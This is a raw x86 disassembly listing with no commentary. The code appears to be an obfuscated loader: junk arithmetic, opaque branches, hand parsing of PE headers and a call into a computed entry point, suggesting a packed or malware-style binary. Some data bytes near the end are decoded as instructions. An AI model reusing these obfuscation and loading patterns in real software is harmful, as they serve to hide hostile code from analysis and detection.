  42473d:	jne    0x423b33
  424743:	or     DWORD PTR ds:0x42a2d6,0x5541
  42474d:	lea    eax,[esp+0x78]
  424751:	sub    DWORD PTR ds:0x42a302,0x686a
  42475b:	push   eax
  42475c:	xor    DWORD PTR ds:0x42a2fa,0x42a2f6
  424766:	push   0x4299d2
  42476b:	add    DWORD PTR ds:0x42a2c6,0x4894
  424775:	call   DWORD PTR ds:0x42a406
  42477b:	mov    DWORD PTR ds:0x42a256,0x5d36
  424785:	cmp    eax,0xffffffff
  424788:	mov    DWORD PTR ds:0x42a296,0x63d2
  424792:	jne    0x423b33
  424798:	adc    DWORD PTR ds:0x42a2de,0x6d
  4247a2:	push   0xf
  4247a4:	xor    DWORD PTR ds:0x42a2ea,0x42a2be
  4247ae:	lea    eax,[esp+0x44]
  4247b2:	xor    DWORD PTR ds:0x42a25a,0x245a
  4247bc:	push   eax
  4247bd:	adc    DWORD PTR ds:0x42a26a,0x29d1
  4247c7:	push   0x429a26
  4247cc:	push   0x429a3a
  4247d1:	sbb    DWORD PTR ds:0x42a25a,0x42a26e
  4247db:	push   0x429a5a
  4247e0:	adc    DWORD PTR ds:0x42a28a,0x42a2ae
  4247ea:	call   esi
  4247ec:	imul   eax,eax,0x300000
  4247f2:	cmp    eax,0x1b00000
  4247f7:	jne    0x423b33
  4247fd:	mov    DWORD PTR ds:0x42a2da,0x5dc8
  424807:	lea    eax,[esp+0x1b8]
  42480e:	add    DWORD PTR ds:0x42a2a6,0x42a2b6
  424818:	push   eax
  424819:	not    DWORD PTR ds:0x42a25e
  42481f:	push   0x429a96
  424824:	call   DWORD PTR ds:0x42a402
  42482a:	mov    DWORD PTR ds:0x42a2f2,0x183e
  424834:	cmp    eax,0xffffffff
  424837:	jne    0x423b33
  42483d:	lea    eax,[esp+0x78]
  424841:	xor    DWORD PTR ds:0x42a2e2,0x57b8
  42484b:	push   eax
  42484c:	push   0x429a82
  424851:	add    DWORD PTR ds:0x42a2ba,0x1e81
  42485b:	call   DWORD PTR ds:0x42a406
  424861:	mov    DWORD PTR ds:0x42a2ce,0x328a
  42486b:	cmp    eax,0xffffffff
  42486e:	mov    DWORD PTR ds:0x42a302,0x13f0
  424878:	jne    0x423b33
  42487e:	push   0xf
  424880:	lea    eax,[esp+0x44]
  424884:	adc    DWORD PTR ds:0x42a2ce,0x42a27e
  42488e:	push   eax
  42488f:	xor    DWORD PTR ds:0x42a2da,0x725b
  424899:	push   0x429ad6
  42489e:	adc    DWORD PTR ds:0x42a2c6,0x39d7
  4248a8:	push   0x429aea
  4248ad:	xor    DWORD PTR ds:0x42a296,0x42a2b2
  4248b7:	push   0x429b0a
  4248bc:	call   esi
  4248be:	adc    DWORD PTR ds:0x42a2b6,0x42a302
  4248c8:	imul   eax,eax,0x300000
  4248ce:	cmp    eax,0x1b00000
  4248d3:	jne    0x423b33
  4248d9:	lea    eax,[esp+0x1b8]
  4248e0:	push   eax
  4248e1:	push   0x429b46
  4248e6:	call   DWORD PTR ds:0x42a402
  4248ec:	cmp    eax,0xffffffff
  4248ef:	jne    0x423b33
  4248f5:	lea    eax,[esp+0x78]
  4248f9:	push   eax
  4248fa:	push   0x429b32
  4248ff:	call   DWORD PTR ds:0x42a406
  424905:	cmp    eax,0xffffffff
  424908:	jne    0x423b33
  42490e:	push   0xf
  424910:	lea    eax,[esp+0x44]
  424914:	push   eax
  424915:	push   0x429b86
  42491a:	push   0x429b9a
  42491f:	push   0x429bba
  424924:	call   esi
  424926:	imul   eax,eax,0x300000
  42492c:	cmp    eax,0x1b00000
  424931:	jne    0x423b33
  424937:	lea    eax,[esp+0x1b8]
  42493e:	push   eax
  42493f:	push   0x429bf6
  424944:	call   DWORD PTR ds:0x42a402
  42494a:	cmp    eax,0xffffffff
  42494d:	jne    0x423b33
  424953:	lea    eax,[esp+0x78]
  424957:	push   eax
  424958:	push   0x429be2
  42495d:	call   DWORD PTR ds:0x42a406
  424963:	cmp    eax,0xffffffff
  424966:	jne    0x423b33
  42496c:	push   0xf
  42496e:	lea    eax,[esp+0x44]
  424972:	push   eax
  424973:	push   0x429c36
  424978:	push   0x429c4a
  42497d:	push   0x429c6a
  424982:	call   esi
  424984:	imul   eax,eax,0x300000
  42498a:	cmp    eax,0x1b00000
  42498f:	jne    0x423b33
  424995:	lea    eax,[esp+0x1b8]
  42499c:	push   eax
  42499d:	push   0x429ca6
  4249a2:	call   DWORD PTR ds:0x42a402
  4249a8:	cmp    eax,0xffffffff
  4249ab:	jne    0x423b33
  4249b1:	lea    eax,[esp+0x78]
  4249b5:	push   eax
  4249b6:	push   0x429c92
  4249bb:	call   DWORD PTR ds:0x42a406
  4249c1:	cmp    eax,0xffffffff
  4249c4:	jne    0x423b33
  4249ca:	push   0xf
  4249cc:	lea    eax,[esp+0x44]
  4249d0:	push   eax
  4249d1:	push   0x429ce6
  4249d6:	push   0x429cfa
  4249db:	push   0x429d1a
  4249e0:	call   esi
  4249e2:	imul   eax,eax,0x300000
  4249e8:	cmp    eax,0x1b00000
  4249ed:	jne    0x423b33
  4249f3:	lea    eax,[esp+0x1b8]
  4249fa:	push   eax
  4249fb:	push   0x429d56
  424a00:	call   DWORD PTR ds:0x42a402
  424a06:	cmp    eax,0xffffffff
  424a09:	jne    0x423b33
  424a0f:	lea    eax,[esp+0x78]
  424a13:	push   eax
  424a14:	push   0x429d42
  424a19:	call   DWORD PTR ds:0x42a406
  424a1f:	cmp    eax,0xffffffff
  424a22:	jne    0x423b33
  424a28:	push   0xf
  424a2a:	lea    eax,[esp+0x44]
  424a2e:	push   eax
  424a2f:	push   0x429d96
  424a34:	push   0x429daa
  424a39:	push   0x429dca
  424a3e:	call   esi
  424a40:	imul   eax,eax,0x300000
  424a46:	cmp    eax,0x1b00000
  424a4b:	jne    0x423b33
  424a51:	lea    eax,[esp+0x1b8]
  424a58:	push   eax
  424a59:	push   0x429e06
  424a5e:	call   DWORD PTR ds:0x42a402
  424a64:	cmp    eax,0xffffffff
  424a67:	jne    0x423b33
  424a6d:	lea    eax,[esp+0x78]
  424a71:	push   eax
  424a72:	push   0x429df2
  424a77:	call   DWORD PTR ds:0x42a406
  424a7d:	cmp    eax,0xffffffff
  424a80:	jne    0x423b33
  424a86:	push   0xf
  424a88:	lea    eax,[esp+0x44]
  424a8c:	push   eax
  424a8d:	push   0x429e46
  424a92:	push   0x429e5a
  424a97:	push   0x429e7a
  424a9c:	call   esi
  424a9e:	imul   eax,eax,0x300000
  424aa4:	cmp    eax,0x1b00000
  424aa9:	jne    0x423b33
  424aaf:	lea    eax,[esp+0x1b8]
  424ab6:	push   eax
  424ab7:	push   0x429eb6
  424abc:	call   DWORD PTR ds:0x42a402
  424ac2:	cmp    eax,0xffffffff
  424ac5:	jne    0x423b33
  424acb:	mov    eax,DWORD PTR [esp+0x3c]
  424acf:	cmp    eax,0xf89c85ba
  424ad4:	je     0x424b33
  424ada:	mov    eax,DWORD PTR [esp+0x20]
  424ade:	mov    ecx,DWORD PTR [esp+0x38]
  424ae2:	xor    eax,edi
  424ae4:	add    eax,ebx
  424ae6:	cmp    eax,ecx
  424ae8:	je     0x424b33
  424aee:	mov    eax,ds:0x42941e
  424af3:	mov    eax,DWORD PTR [eax+0x194]
  424af9:	mov    ecx,DWORD PTR [eax]
  424afb:	mov    eax,DWORD PTR [ecx+0x3c]
  424afe:	push   DWORD PTR ds:0x4294fe
  424b04:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  424b08:	push   DWORD PTR ds:0x4292a2
  424b0e:	add    eax,ecx
  424b10:	mov    ecx,DWORD PTR ds:0x42941e
  424b16:	mov    ecx,DWORD PTR [ecx+0x194]
  424b1c:	push   DWORD PTR [ecx]
  424b1e:	call   eax
  424b20:	mov    ecx,DWORD PTR ds:0x42941e
  424b26:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424b2c:	mov    DWORD PTR [ecx],eax
  424b2e:	jmp    0x424d60
  424b33:	mov    eax,DWORD PTR [esp+0x20]
  424b37:	mov    ecx,DWORD PTR [esp+0x60]
  424b3b:	xor    eax,edi
  424b3d:	add    eax,ebx
  424b3f:	cmp    eax,ecx
  424b41:	jne    0x424baa
  424b47:	mov    eax,DWORD PTR [esp+0x20]
  424b4b:	mov    ecx,DWORD PTR ds:0x42941e
  424b51:	mov    ecx,DWORD PTR [ecx+0x198]
  424b57:	xor    eax,edi
  424b59:	add    eax,ebx
  424b5b:	cmp    eax,DWORD PTR [ecx]
  424b5d:	jne    0x424b83
  424b63:	mov    eax,DWORD PTR [esp+0x20]
  424b67:	push   0xf89c85a5
  424b6c:	xor    eax,edi
  424b6e:	add    eax,ebx
  424b70:	push   eax
  424b71:	push   0xf89c85b9
  424b76:	push   DWORD PTR [esp+0x18]
  424b7a:	push   DWORD PTR [esp+0x30]
  424b7e:	call   0x42342f
  424b83:	push   DWORD PTR [esp+0xc]
  424b87:	push   DWORD PTR [esp+0x24]
  424b8b:	call   0x401000
  424b90:	mov    eax,DWORD PTR [esp+0x20]
  424b94:	xor    eax,edi
  424b96:	add    eax,ebx
  424b98:	mov    ds:0x4294aa,eax
  424b9d:	mov    eax,DWORD PTR [esp+0x20]
  424ba1:	xor    eax,edi
  424ba3:	add    eax,ebx
  424ba5:	mov    ds:0x4294a2,eax
  424baa:	mov    eax,DWORD PTR [esp+0x2c]
  424bae:	test   eax,eax
  424bb0:	je     0x424d60
  424bb6:	lea    eax,[esp+0x78]
  424bba:	mov    DWORD PTR [esp+0x64],0xf152c32
  424bc2:	push   eax
  424bc3:	mov    DWORD PTR [esp+0x78],0x712ed2f
  424bcb:	mov    DWORD PTR [esp+0x74],0x373fc0d
  424bd3:	push   0x429ea2
  424bd8:	mov    DWORD PTR [esp+0x70],0x72670add
  424be0:	call   DWORD PTR ds:0x42a406
  424be6:	cmp    eax,0xffffffff
  424be9:	jne    0x423b33
  424bef:	push   0xf
  424bf1:	lea    eax,[esp+0x44]
  424bf5:	push   eax
  424bf6:	push   0x429ef6
  424bfb:	push   0x429f0a
  424c00:	push   0x429f2a
  424c05:	call   esi
  424c07:	imul   eax,eax,0x300000
  424c0d:	cmp    eax,0x1b00000
  424c12:	jne    0x423b33
  424c18:	lea    eax,[esp+0x1b8]
  424c1f:	push   eax
  424c20:	push   0x429f66
  424c25:	call   DWORD PTR ds:0x42a402
  424c2b:	cmp    eax,0xffffffff
  424c2e:	jne    0x423b33
  424c34:	call   0x422008
  424c39:	mov    eax,DWORD PTR [esp+0x34]
  424c3d:	mov    eax,DWORD PTR [esp+0xc]
  424c41:	mov    DWORD PTR [esp+0x30],eax
  424c45:	mov    eax,DWORD PTR [esp+0x20]
  424c49:	mov    DWORD PTR [esp+0xc],eax
  424c4d:	mov    eax,eax
  424c4f:	mov    eax,ds:0x42941e
  424c54:	mov    ecx,DWORD PTR [eax+0x1c0]
  424c5a:	mov    edx,DWORD PTR [ecx]
  424c5c:	and    DWORD PTR [esp+0x1c],0x0
  424c61:	mov    esi,0xfabdbed8
  424c66:	add    edx,esi
  424c68:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424c6d:	mov    ecx,0x8a29a13d
  424c72:	xor    edx,ecx
  424c74:	mov    DWORD PTR [esp+0x10],edx
  424c78:	mov    edx,DWORD PTR [esp+0x1c]
  424c7c:	xor    edx,0x0
  424c7f:	cmp    DWORD PTR [esp+0x10],0x70941fe4
  424c87:	mov    DWORD PTR [esp+0x14],edx
  424c8b:	jne    0x424c9a
  424c91:	cmp    edx,0xffffffff
  424c94:	je     0x424d03
  424c9a:	mov    eax,DWORD PTR [eax+0x1c8]
  424ca0:	mov    eax,DWORD PTR [eax]
  424ca2:	cdq    
  424ca3:	add    eax,esi
  424ca5:	adc    edx,0xffffffff
  424ca8:	and    DWORD PTR [esp+0x1c],0x0
  424cad:	xor    edx,0x0
  424cb0:	mov    DWORD PTR [esp+0x24],edx
  424cb4:	mov    edx,DWORD PTR [esp+0xc]
  424cb8:	mov    DWORD PTR [esp+0x18],edx
  424cbc:	xor    eax,ecx
  424cbe:	add    DWORD PTR [esp+0x18],esi
  424cc2:	mov    edx,DWORD PTR [esp+0x18]
  424cc6:	adc    DWORD PTR [esp+0x1c],0xffffffff
  424ccb:	xor    edx,ecx
  424ccd:	mov    DWORD PTR [esp+0x10],edx
  424cd1:	mov    edx,DWORD PTR [esp+0x1c]
  424cd5:	xor    edx,0x0
  424cd8:	mov    DWORD PTR [esp+0x14],edx
  424cdc:	cmp    DWORD PTR [esp+0x10],eax
  424ce0:	jne    0x424cf2
  424ce6:	mov    eax,DWORD PTR [esp+0x24]
  424cea:	cmp    edx,eax
  424cec:	je     0x424d03
  424cf2:	mov    eax,DWORD PTR [esp+0xc]
  424cf6:	add    eax,DWORD PTR [esp+0x30]
  424cfa:	mov    DWORD PTR [esp+0xc],eax
  424cfe:	jmp    0x424d60
  424d03:	mov    eax,ds:0x4294a2
  424d08:	mov    edx,DWORD PTR ds:0x4294aa
  424d0e:	xor    eax,edx
  424d10:	mov    ds:0x4294a2,eax
  424d15:	mov    edx,DWORD PTR ds:0x4294a2
  424d1b:	mov    eax,DWORD PTR [esp+0x2c]
  424d1f:	add    DWORD PTR [eax],edx
  424d21:	mov    edx,DWORD PTR [esp+0xc]
  424d25:	mov    eax,ds:0x4294a2
  424d2a:	xor    edx,edi
  424d2c:	add    edx,ebx
  424d2e:	xor    ebx,ebx
  424d30:	add    edx,esi
  424d32:	adc    ebx,0xffffffff
  424d35:	xor    edi,edi
  424d37:	xor    edx,ecx
  424d39:	xor    ebx,0x0
  424d3c:	add    eax,esi
  424d3e:	adc    edi,0xffffffff
  424d41:	xor    eax,ecx
  424d43:	xor    edi,0x0
  424d46:	cmp    eax,edx
  424d48:	jne    0x424d60
  424d4e:	cmp    edi,ebx
  424d50:	jne    0x424d60
  424d56:	mov    eax,ds:0x4294a2
  424d5b:	mov    ds:0x4294aa,eax
  424d60:	lea    eax,[esp+0x78]
  424d64:	push   eax
  424d65:	push   0x429f52
  424d6a:	call   DWORD PTR ds:0x42a406
  424d70:	cmp    eax,0xffffffff
  424d73:	jne    0x423b33
  424d79:	push   0xf
  424d7b:	lea    eax,[esp+0x44]
  424d7f:	push   eax
  424d80:	push   0x429fa6
  424d85:	push   0x429fba
  424d8a:	push   0x429fda
  424d8f:	call   DWORD PTR ds:0x42a3fe
  424d95:	imul   eax,eax,0x300000
  424d9b:	cmp    eax,0x1b00000
  424da0:	jne    0x423b33
  424da6:	lea    eax,[esp+0x1b8]
  424dad:	push   eax
  424dae:	push   0x42a006
  424db3:	call   DWORD PTR ds:0x42a402
  424db9:	cmp    eax,0xffffffff
  424dbc:	jne    0x423b33
  424dc2:	mov    eax,ds:0x42941e
  424dc7:	push   0x4
  424dc9:	add    eax,0x1cc
  424dce:	push   eax
  424dcf:	lea    eax,[esp+0x3c]
  424dd3:	push   eax
  424dd4:	call   0x424de8
  424dd9:	mov    eax,DWORD PTR [esp+0x34]
  424ddd:	mov    eax,DWORD PTR [eax]
  424ddf:	pop    edi
  424de0:	pop    esi
  424de1:	pop    ebx
  424de2:	mov    esp,ebp
  424de4:	pop    ebp
  424de5:	ret    0xc
  424de8:	push   ebp
  424de9:	mov    ebp,esp
  424deb:	sub    esp,0x10
  424dee:	or     eax,0x4f1d
  424df3:	mov    eax,0xf89c85a5
  424df8:	mov    DWORD PTR [ebp-0x4],eax
  424dfb:	or     ecx,edx
  424dfd:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  424e04:	add    DWORD PTR ds:0x42a2da,edi
  424e0a:	mov    ecx,DWORD PTR [ebp-0x4]
  424e0d:	movzx  edx,BYTE PTR ds:0x42a2f6
  424e14:	adc    DWORD PTR ds:0x42a2da,edx
  424e1a:	push   esi
  424e1b:	or     DWORD PTR ds:0x42a2ba,ebx
  424e21:	mov    edx,0x75108aa
  424e26:	xor    esi,DWORD PTR ds:0x42a27e
  424e2c:	xor    ecx,edx
  424e2e:	mov    DWORD PTR ds:0x42a2ae,0x17
  424e38:	cmp    DWORD PTR ds:0x42a2ae,0x0
  424e3f:	je     0x424e72
  424e45:	cmp    DWORD PTR ds:0x42a2ae,0x19
  424e4c:	jb     0x424e72
  424e52:	jmp    0x424e60
  424e57:	push   DWORD PTR [ebp-0x14]
  424e5a:	call   DWORD PTR ds:0x42a3ea
  424e60:	mov    esi,DWORD PTR ds:0x42a2ae
  424e66:	dec    esi
  424e67:	mov    DWORD PTR ds:0x42a2ae,esi
  424e6d:	jmp    0x424e38
  424e72:	mov    esi,0x3272f1
  424e77:	adc    DWORD PTR ds:0x42a272,0x42a296
  424e81:	push   edi
  424e82:	adc    DWORD PTR ds:0x42a2fa,0x7011
  424e8c:	mov    edi,DWORD PTR [ebp+0x10]
  424e8f:	add    DWORD PTR ds:0x42a2ea,0x6129
  424e99:	add    ecx,esi
  424e9b:	mov    DWORD PTR ds:0x42a302,0x6d2d
  424ea5:	cmp    ecx,edi
  424ea7:	mov    DWORD PTR ds:0x42a2d6,0xb6
  424eb1:	je     0x424fdc
  424eb7:	mov    ecx,DWORD PTR ds:0x42a2be
  424ebd:	adc    DWORD PTR ds:0x42a2e2,ecx
  424ec3:	mov    ecx,DWORD PTR [ebp-0x4]
  424ec6:	mov    edi,DWORD PTR [ebp+0x10]
  424ec9:	xor    eax,eax
  424ecb:	sbb    DWORD PTR ds:0x42a27a,0x42a2da
  424ed5:	xor    ecx,edx
  424ed7:	add    ecx,esi
  424ed9:	xor    DWORD PTR ds:0x42a2f6,0x42a2ae
  424ee3:	add    edi,0xfabdbed8
  424ee9:	mov    DWORD PTR ds:0x42a2b2,0x6fd3
  424ef3:	adc    eax,0xffffffff
  424ef6:	sbb    DWORD PTR ds:0x42a292,0x6e41
  424f00:	xor    eax,0x0
  424f03:	adc    DWORD PTR ds:0x42a2de,0x42a2f2
  424f0d:	mov    DWORD PTR [ebp-0xc],eax
  424f10:	push   ebx
  424f11:	dec    eax
  424f12:	xor    ebx,ebx
  424f14:	xor    edi,0x8a29a13d
  424f1a:	mov    eax,ds:0x42a336
  424f1f:	mov    eax,DWORD PTR [eax]
  424f21:	and    DWORD PTR ds:0x42a2d2,eax
  424f27:	mov    eax,ecx
  424f29:	add    eax,0xfabdbed8
  424f2e:	adc    ebx,0xffffffff
  424f31:	mov    DWORD PTR ds:0x42a2ea,0x4e45
  424f3b:	xor    eax,0x8a29a13d
  424f40:	inc    DWORD PTR ds:0x42a27e
  424f46:	xor    ebx,0x0
  424f49:	mov    DWORD PTR ds:0x42a2da,0x13c1
  424f53:	cmp    eax,edi
  424f55:	jne    0x424f6e
  424f5b:	cmp    ebx,DWORD PTR [ebp-0xc]
  424f5e:	je     0x424fd6
  424f64:	jmp    0x424f6e
  424f69:	mov    esi,0x3272f1
  424f6e:	mov    eax,DWORD PTR [ebp-0x4]
  424f71:	mov    edi,DWORD PTR [ebp-0x8]
  424f74:	xor    edi,edx
  424f76:	add    edi,esi
  424f78:	mov    esi,DWORD PTR [ebp+0x8]
  424f7b:	imul   edi,ecx
  424f7e:	mov    ebx,DWORD PTR [ebp+0xc]
  424f81:	xor    eax,edx
  424f83:	add    eax,ecx
  424f85:	mov    al,BYTE PTR [ebx+eax*1+0x3272f1]
  424f8c:	mov    BYTE PTR [edi+esi*1],al
  424f8f:	mov    eax,DWORD PTR [ebp-0x8]
  424f92:	mov    esi,DWORD PTR [ebp+0x10]
  424f95:	xor    eax,edx
  424f97:	xor    ebx,ebx
  424f99:	add    esi,0xfabdbed8
  424f9f:	adc    ebx,0xffffffff
  424fa2:	lea    ecx,[ecx+eax*1+0x3272f1]
  424fa9:	xor    edi,edi
  424fab:	xor    esi,0x8a29a13d
  424fb1:	xor    ebx,0x0
  424fb4:	mov    eax,ecx
  424fb6:	add    eax,0xfabdbed8
  424fbb:	adc    edi,0xffffffff
  424fbe:	xor    eax,0x8a29a13d
  424fc3:	xor    edi,0x0
  424fc6:	cmp    eax,esi
  424fc8:	jne    0x424f69
  424fce:	cmp    edi,ebx
  424fd0:	jne    0x424f69
  424fd6:	mov    eax,0xf89c85ba
  424fdb:	pop    ebx
  424fdc:	pop    edi
  424fdd:	pop    esi
  424fde:	leave  
  424fdf:	ret    0xc
  424fe2:	push   ebp
  424fe3:	mov    ebp,esp
  424fe5:	push   ecx
  424fe6:	xor    ecx,0x1d8f
  424fec:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  424ff3:	mov    DWORD PTR ds:0x42a2a6,0x12
  424ffd:	cmp    DWORD PTR ds:0x42a2a6,0x0
  425004:	je     0x42503e
  42500a:	cmp    DWORD PTR ds:0x42a2a6,0x14
  425011:	jb     0x42503e
  425017:	jmp    0x42502c
  42501c:	push   0x42a2ee
  425021:	push   0x429000
  425026:	call   DWORD PTR ds:0x42a3f2
  42502c:	mov    edx,DWORD PTR ds:0x42a2a6
  425032:	dec    edx
  425033:	mov    DWORD PTR ds:0x42a2a6,edx
  425039:	jmp    0x424ffd
  42503e:	mov    eax,DWORD PTR [ebp+0x8]
  425041:	adc    DWORD PTR ds:0x42a2ce,0x6bd6
  42504b:	movsx  eax,BYTE PTR [eax]
  42504e:	adc    DWORD PTR ds:0x42a2ea,ebx
  425054:	mov    edx,0x3272f1
  425059:	and    DWORD PTR ds:0x42a2e6,0x2b27
  425063:	sub    eax,edx
  425065:	mov    ecx,0x75108aa
  42506a:	add    DWORD PTR ds:0x42a256,0x714
  425074:	xor    eax,ecx
  425076:	mov    DWORD PTR ds:0x42a2f6,0x37ad
  425080:	cmp    eax,0xf89c85f6
  425085:	jne    0x4250b4
  42508b:	mov    eax,DWORD PTR [ebp+0x8]
  42508e:	push   esi
  42508f:	mov    esi,DWORD PTR [ebp+0x8]
  425092:	add    esi,DWORD PTR [eax+0x3c]
  425095:	mov    DWORD PTR [ebp+0x8],esi
  425098:	mov    eax,DWORD PTR [ebp-0x4]
  42509b:	mov    esi,DWORD PTR [ebp+0x8]
  42509e:	xor    eax,ecx
  4250a0:	add    eax,edx
  4250a2:	cmp    DWORD PTR [esi+0x54],eax
  4250a5:	pop    esi
  4250a6:	je     0x4250b4
  4250ac:	mov    eax,DWORD PTR [ebp+0x8]
  4250af:	jmp    0x4250bb
  4250b4:	mov    eax,DWORD PTR [ebp-0x4]
  4250b7:	xor    eax,ecx
  4250b9:	add    eax,edx
  4250bb:	leave  
  4250bc:	ret    0x4
  4250bf:	push   ebp
  4250c0:	mov    ebp,esp
  4250c2:	sub    esp,0xc
  4250c5:	mov    DWORD PTR ds:0x42a25a,0x10
  4250cf:	cmp    DWORD PTR ds:0x42a25a,0x0
  4250d6:	je     0x425131
  4250dc:	cmp    DWORD PTR ds:0x42a25a,0x7
  4250e3:	jle    0x425131
  4250e9:	jmp    0x425103
  4250ee:	push   0x3f8d
  4250f3:	push   0x4291fd
  4250f8:	push   0x4291fd
  4250fd:	call   DWORD PTR ds:0x42a3b6
  425103:	cmp    DWORD PTR ds:0x42a25a,0x8
  42510a:	jne    0x42511d
  425110:	mov    edx,DWORD PTR ds:0x42a25a
  425116:	dec    edx
  425117:	mov    DWORD PTR ds:0x42a25a,edx
  42511d:	xor    edx,edx
  42511f:	or     edx,DWORD PTR ds:0x42a25a
  425125:	dec    edx
  425126:	mov    DWORD PTR ds:0x42a25a,edx
  42512c:	jmp    0x4250cf
  425131:	push   esi
  425132:	mov    esi,0xf89c85a5
  425137:	mov    DWORD PTR [ebp-0x8],esi
  42513a:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  425141:	mov    DWORD PTR ds:0x42a2b6,0x3461
  42514b:	push   edi
  42514c:	xor    DWORD PTR ds:0x42a256,0x42a262
  425156:	mov    eax,eax
  425158:	and    DWORD PTR ds:0x42a2aa,0x0
  425162:	jmp    0x425176
  425167:	xor    edx,edx
  425169:	or     edx,DWORD PTR ds:0x42a2aa
  42516f:	inc    edx
  425170:	mov    DWORD PTR ds:0x42a2aa,edx
  425176:	cmp    DWORD PTR ds:0x42a2aa,0x1c
  42517d:	jae    0x4251c8
  425183:	cmp    DWORD PTR ds:0x42a2aa,0x7
  42518a:	jb     0x4251c8
  425190:	jmp    0x4251a9
  425195:	push   DWORD PTR [ebp-0x20]
  425198:	push   0x42a2ea
  42519d:	push   DWORD PTR [ebp-0x20]
  4251a0:	push   DWORD PTR [ebp-0x20]
  4251a3:	call   DWORD PTR ds:0x42a3f6
  4251a9:	cmp    DWORD PTR ds:0x42a2aa,0x6
  4251b0:	jne    0x4251c3
  4251b6:	mov    edx,DWORD PTR ds:0x42a2aa
  4251bc:	inc    edx
  4251bd:	mov    DWORD PTR ds:0x42a2aa,edx
  4251c3:	jmp    0x425167
  4251c8:	mov    eax,DWORD PTR [ebp-0x4]
  4251cb:	and    DWORD PTR ds:0x42a2ea,0x0
  4251d5:	jmp    0x4251e7
  4251da:	mov    edx,DWORD PTR ds:0x42a2ea
  4251e0:	inc    edx
  4251e1:	mov    DWORD PTR ds:0x42a2ea,edx
  4251e7:	cmp    DWORD PTR ds:0x42a2ea,0x1e
  4251ee:	jae    0x425219
  4251f4:	cmp    DWORD PTR ds:0x42a2ea,0x25
  4251fb:	jbe    0x425219
  425201:	jmp    0x425214
  425206:	push   0x42919f
  42520b:	push   DWORD PTR [ebp-0xc]
  42520e:	call   DWORD PTR ds:0x42a3ba
  425214:	jmp    0x4251da
  425219:	mov    edi,DWORD PTR [ebp-0x8]
  42521c:	mov    ecx,0x75108aa
  425221:	xor    eax,ecx
  425223:	xor    edi,ecx
  425225:	mov    edx,0x3272f1
  42522a:	add    edi,edx
  42522c:	add    eax,edx
  42522e:	imul   eax,edi
  425231:	mov    edi,DWORD PTR [ebp+0xc]
  425234:	cmp    edi,eax
  425236:	je     0x42528b
  42523c:	mov    DWORD PTR [ebp-0xc],esi
  42523f:	mov    eax,DWORD PTR [ebp-0xc]
  425242:	mov    esi,DWORD PTR [ebp+0xc]
  425245:	xor    eax,ecx
  425247:	lea    eax,[eax*8+0x1939800]
  42524e:	mov    eax,DWORD PTR [esi+eax*1]
  425251:	mov    DWORD PTR [ebp+0xc],eax
  425254:	mov    eax,DWORD PTR [ebp-0x4]
  425257:	mov    esi,DWORD PTR [ebp-0x8]
  42525a:	xor    eax,ecx
  42525c:	xor    esi,ecx
  42525e:	add    esi,edx
  425260:	add    eax,edx
  425262:	imul   eax,esi
  425265:	mov    esi,DWORD PTR [ebp+0xc]
  425268:	cmp    esi,eax
  42526a:	je     0x42528b
  425270:	mov    eax,DWORD PTR [ebp-0x4]
  425273:	xor    eax,ecx
  425275:	mov    ecx,DWORD PTR [ebp+0xc]
  425278:	add    eax,edx
  42527a:	imul   eax,ecx
  42527d:	add    eax,DWORD PTR [ebp+0x8]
  425280:	mov    DWORD PTR [ebp+0xc],eax
  425283:	mov    eax,DWORD PTR [ebp+0xc]
  425286:	jmp    0x42529c
  42528b:	mov    eax,DWORD PTR [ebp-0x4]
  42528e:	mov    esi,DWORD PTR [ebp-0x8]
  425291:	xor    esi,ecx
  425293:	xor    eax,ecx
  425295:	add    esi,edx
  425297:	add    eax,edx
  425299:	imul   eax,esi
  42529c:	pop    edi
  42529d:	pop    esi
  42529e:	leave  
  42529f:	ret    0x8
	...
  4252b2:	add    BYTE PTR [eax],al
  4252b4:	leave  
  4252b5:	dec    edx
  4252b6:	jns    0x425305
  4252b8:	add    BYTE PTR [eax],al
  4252ba:	add    BYTE PTR [eax],al
  4252bc:	add    al,BYTE PTR [eax]
  4252be:	add    BYTE PTR [eax],al
  4252c0:	xor    BYTE PTR [eax],al
  4252c2:	add    BYTE PTR [eax],al
  4252c4:	rcl    BYTE PTR [edx+0x2],1
  4252c7:	add    al,dl
  4252c9:	inc    esi
  4252ca:	add    al,BYTE PTR [eax]
  4252cc:	add    BYTE PTR [eax],al
  4252ce:	add    BYTE PTR [eax],al
  4252d0:	push   edx
  4252d1:	push   ebx
  4252d2:	inc    esp
  4252d3:	push   ebx
  4252d4:	test   BYTE PTR [ebx-0x48471d3],dh
  4252da:	and    ecx,DWORD PTR [ebx-0x74]
  4252dd:	and    ebp,DWORD PTR [eax+0x57dc97d9]
  4252e3:	inc    ebp
  4252e4:	add    DWORD PTR [eax],eax
  4252e6:	add    BYTE PTR [eax],al
  4252e8:	inc    esi
  4252e9:	cmp    bl,BYTE PTR [edi+edx*2+0x69]
  4252ed:	outs   dx,BYTE PTR ds:[esi]
  4252ee:	outs   dx,DWORD PTR fs:[esi]
  4252f0:	ja     0x425365
  4252f2:	and    BYTE PTR [ecx+ebp*2+0x72],al
  4252f6:	pop    esp
  4252f7:	inc    esi
  4252f8:	imul   ebp,DWORD PTR [ebp+eiz*2+0x45],0x636578
  425300:	mov    edx,DWORD PTR [ebp-0x14]
  425303:	sub    esp,0x108
  425309:	push   ebx
  42530a:	mov    eax,ebx
  42530c:	xchg   ecx,eax
  42530d:	mov    eax,DWORD PTR [ebp+0x8]
  425310:	cmp    eax,0xf89c85a5
  425315:	jne    0x4257cf
  42531b:	mov    eax,DWORD PTR [ebp+0xc]
  42531e:	cmp    eax,0xf89c85ba
  425323:	jne    0x4257cf
  425329:	mov    eax,DWORD PTR [ebp+0x24]
  42532c:	mov    DWORD PTR [ebp-0x4],eax
  42532f:	mov    eax,DWORD PTR [ebp-0x4]
  425332:	mov    eax,DWORD PTR [eax+0x1d8]
  425338:	mov    eax,DWORD PTR [eax]
  42533a:	mov    eax,DWORD PTR [eax]
  42533c:	mov    DWORD PTR [ebp-0x8],eax
  42533f:	mov    BYTE PTR [ebp-0x18],0x1a
  425343:	mov    BYTE PTR [ebp-0x17],0x1f
  425347:	mov    BYTE PTR [ebp-0x16],0x14
  42534b:	mov    BYTE PTR [ebp-0x15],0x4e
  42534f:	mov    BYTE PTR [ebp-0x14],0x4d
